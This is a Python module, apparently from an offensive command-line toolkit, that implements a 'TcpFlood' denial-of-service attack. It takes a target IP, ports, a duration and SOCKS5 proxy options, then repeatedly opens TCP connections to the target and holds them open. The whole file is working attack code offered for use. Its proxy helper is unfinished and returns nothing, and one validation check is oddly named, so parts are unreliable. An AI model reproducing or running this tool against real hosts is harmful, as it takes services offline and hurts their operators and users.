import socket
import threading
import time
import socks

from lib.cmd_tool import *

NAME = 'TcpFlood'

class Module:
    def __init__(self):
        self.config = {
            'IP': {
                'value': '',
                'help': 'Target IP.',
            },
            'Ports': {
                'value': '80',
                'help': 'Target ports.',
            },
            'Timeout': {
                'value': '10',
                'help': 'Socket timeout (second).'
            },
            'Time': {
                'value': '10',
                'help': 'Time of sending packet.'
            },
            'ProxyHosts': {
                'value': '',
                'help': 'SOCK5 proxy hosts.'
            },
            'ProxyFile': {
                'value': '',
                'help': 'File of multiple SOCKS5 proxy hosts.',
            }
        }

        self.help = ''
        self.lsSocket = []

    def validate(self) -> bool:
        szIP = get_value(self.config, 'IP')
        szPorts = get_value(self.config, 'Ports')
        szTimeout = get_value(self.config, 'Timeout')
        szTime = get_value(self.config, 'Time')

        if not szIP:
            cp.pf_failed('IP is null or empty.')
            return False
        
        if not szPorts:
            cp.pf_failed('Ports is null or empty.')
            return False
        
        if not isNonPositiveInt(szTimeout):
            cp.pf_failed('Invalid timeout value.')
            return False

        if not isNonPositiveInt(szTime):
            cp.pf_failed('Invalid time value.')
            return False

        return True

    def interactive(self):
        interactive(self, 'tcp_flood')

    def get_proxy(self) -> str:
        szVal = get_value(self.config, 'ProxyHosts')

        lsProxy = str2strls(szVal)

    def init_socket(self, nTimeout: int):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(nTimeout)

            return sock
        except Exception as ex:
            cp.pf_failed(str(ex))
            return None

    def run(self):
        def tcp_flood(szIP: str, nPort: int, nTimeout: int):
            try:
                sock = self.init_socket(nTimeout)
                sock.connect((szIP, nPort))

                self.lsSocket.append(sock)
            except Exception as ex:
                cp.pf_failed(str(ex))

        try:
            lsIP = str2strls(get_value(self.config, 'IP'))
            lsPort = str2intls(get_value(self.config, 'Ports'))
            nTime = int(get_value(self.config, 'Time'))
            nTimeout = int(get_value(self.config, 'Timeout'))

            total = 0

            for ip in lsIP:
                for port in lsPort:
                    total += doWorkWithSeconds(tcp_flood, nTime, {'szIP': ip, 'nPort': port, 'nTimeout': nTimeout})
            
            cp.pf_ok(f'Done, total={total}')

            input('Press enter to close all socket>')

            for sock in self.lsSocket:
                sock.close()

        except Exception as ex:
            cp.pf_failed(str(ex))